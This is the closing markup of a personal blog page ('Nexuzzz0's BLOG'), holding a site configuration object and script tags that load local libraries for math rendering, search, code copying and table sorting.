</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>